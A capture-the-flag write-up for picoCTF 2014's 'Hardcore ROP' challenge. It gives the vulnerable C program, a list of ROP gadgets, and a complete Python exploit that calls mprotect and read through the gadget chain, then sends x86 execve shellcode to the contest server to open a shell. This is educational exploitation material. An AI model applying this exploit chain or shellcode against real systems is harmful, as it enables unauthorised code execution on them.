# Hardcore ROP

Let's take a look at the source:
```c
// PIE, NX, statically linked, with symbols.
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <time.h>
#include <sys/mman.h>
#include <sys/stat.h>

#define MAPLEN (4096*10)

void randop() {
	munmap((void*)0x0F000000, MAPLEN);
	void *buf = mmap((void*)0x0F000000, MAPLEN, PROT_READ|PROT_WRITE, MAP_ANON|MAP_PRIVATE|MAP_FIXED, 0, 0);
	unsigned seed;
	if(read(0, &seed, 4) != 4) return;
	srand(seed);
	for(int i = 0; i < MAPLEN - 4; i+=3) {
		*(int *)&((char*)buf)[i] = rand();
		if(i%66 == 0) ((char*)buf)[i] = 0xc3;
	}
	mprotect(buf, MAPLEN, PROT_READ|PROT_EXEC);
	puts("ROP time!");
	fflush(stdout);
	size_t x, count = 0;
	do x = read(0, ((char*)&seed)+count, 555-count);
	while(x > 0 && (count += x) < 555 && ((char*)&seed)[count-1] != '\n');
}

int main(int argc, char *argv[]) {
	struct stat st;
	if(argc != 2 || chdir(argv[1]) != 0 || stat("./flag", &st) != 0) {
		puts("oops, problem set up wrong D:");
		fflush(stdout);
		return 1;
	} else {
		puts("yo, what's up?");
		alarm(30); sleep(1);
		randop();
		fflush(stdout);
		return 0;
	}
}
```

Looks like the program creates a buffer at 0x0f000000 with length 40960 (0xa000), and fills it with random bytes, with rets (0xc3) sprinkled in. We also get to supply the random seed, so it stays constant with each run.

Since PIE, ASLR, and NX are enabled, we'll have to ROP using that buffer, since it's the only constant memory address we know.

Trying random seeds to generate good ROP gadgets, we find "quam", which gives us lots of goodies, including a pop/pop/pop/ret, memory dereferencing, and movs.

A list of relevant gadgets:
```
0x0f005489 : (5b5f5f247fd3cac3)	pop ebx; pop edi; pop edi; and al,0x7f; ror edx,cl; ret
0x0f003805 : (8b48a27510c3)	mov ecx,DWORD PTR [eax-0x5e]; jne 0xf00381a; ret
0x0f006c05 : (5cc3)	pop esp; ret
0x0f006827 : (5bc3)	pop ebx; ret
0x0f00062f : (5dc3)	pop ebp; ret
0x0f003e63 : (58c3)	pop eax; ret
0x0f003287 : (59c3)	pop ecx; ret
0x0f004ea1 : (5ec3)	pop esi; ret
0x0f009af1 : (5fc3)	pop edi; ret
0x0f006761 : (5ac3)	pop edx; ret
0x0f00860f : (91c3)	xchg ecx,eax; ret
0x0f00905f : (93c3)	xchg ebx,eax; ret
0x0f007067 : (92c3)	xchg edx,eax; ret
0x0f008273 : (95c3)	xchg ebp,eax; ret
0x0f00627b : (96c3)	xchg esi,eax; ret
0x0f000ffb : (97c3)	xchg edi,eax; ret
0x0f00276f : (89e2c3)	mov edx,esp; ret
0x0f0086d4 : (03eac3)	add ebp,edx; ret
0x0f002b90 : (01f5c3)	add ebp,esi; ret
0x0f008f56 : (00ddc3)	add ch,bl; ret
0x0f005721 : (03c447c3)	add eax,esp; inc edi; ret
0x0f009503 : (53c3)	push ebx; ret
0x0f00141b : (52c3)	push edx; ret
0x0f008651 : (50c3)	push eax; ret
0x0f0046a3 : (55c3)	push ebp; ret
0x0f0022cd : (56c3)	push esi; ret
0x0f004307 : (57c3)	push edi; ret
0x0f002039 : (51c3)	push ecx; ret
0x0f001443 : (89f8c3)	mov eax,edi; ret
0x0f002ecc : (29d6c3)	sub esi,edx; ret
```

Searching around in memory with ASLR in gdb enabled, we find an address that stays constant relative to the binary.

We can load the offset of that location and dereference. After manipulation, we get the addresses of mprotect and read.
We need to call mprotect and make the buffer RWX, then call read to read in our shellcode. We can then return to that, giving us a shell.

The final exploit is below:

```python
import struct
import sys
import socket
import telnetlib
import time

# seed + padding
payload = 'quam' + '\xff\xff\xff\xff\x01\x00\x00\x00'*4

# get memory address
payload += struct.pack("<I", 0x0f003e63) # pop eax
payload += struct.pack("<I", 0xf2)       # offset + 0x5e
payload += struct.pack("<I", 0x0f005721) # add eax,esp; (inc edi)
payload += struct.pack("<I", 0x0f003c2d) # inc ebx
payload += struct.pack("<I", 0x0f003805) # mov ecx,DWORD PTR [eax-0x5e]; (jne 0xf00381a)

# subtract offset
payload += struct.pack("<I", 0x0f00860f) # xchg ecx,eax
payload += struct.pack("<I", 0x0f008273) # xchg ebp,eax
payload += struct.pack("<I", 0x0f006761) # pop edx
payload += struct.pack("<I", 0x139)      # offset
payload += struct.pack("<I", 0x0f0086d4) # add ebp,edx

# call mprotect
payload += struct.pack("<I", 0x0f0046a3) # push ebp
payload += struct.pack("<I", 0x0f005489) # pop ebx; pop edi; pop edi; (and al,0x7f); (ror edx,cl)
payload += struct.pack("<I", 0xf000000)  # buffer
payload += struct.pack("<I", 0xa000)     # length
payload += struct.pack("<I", 0x7)        # rwx

# subtract offset
payload += struct.pack("<I", 0x0f006761) # pop edx
payload += struct.pack("<I", 0x409)      # offset
payload += struct.pack("<I", 0x0f0086d4) # add ebp,edx

# call read
payload += struct.pack("<I", 0x0f0046a3) # push ebp
payload += struct.pack("<I", 0x0f005489) # pop ebx; pop edi; pop edi; (and al,0x7f); (ror edx,cl)
payload += struct.pack("<I", 0x0)        # stdin
payload += struct.pack("<I", 0x0f000000) # location
payload += struct.pack("<I", 0x30)       # length

# call shellcode
payload += struct.pack("<I", 0x0f000000) # shellcode location

# shellcode
shellcode = '\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80'

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('vuln2014.picoctf.com', 4000))

f = s.makefile('rw', bufsize=0)
f.write(payload+'\n')
time.sleep(2)
f.write(shellcode)

t = telnetlib.Telnet()
t.sock = s
t.interact()
```
